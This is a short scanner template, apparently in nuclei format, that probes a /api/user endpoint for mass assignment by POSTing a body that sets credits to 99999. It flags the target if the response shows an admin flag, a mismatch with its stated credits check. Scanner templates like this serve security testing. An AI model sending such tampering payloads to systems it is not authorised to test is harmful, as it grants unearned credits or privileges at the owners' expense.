id: mass2-022
name: 'Mass field credits'
severity: high
type: active
tags:
  - mass-assignment
  - auth
  - api
description: 'Unfiltered credits on /api/user'
requests:
  - method: POST
    path: '{{BaseURL}}/api/user'
    body: '{"name":"t","credits":99999}'
    match-all: true
    matchers:
      - type: status
        status: [200]
      - type: regex
        part: body
        regex:
          - '"admin"\s*:\s*true'
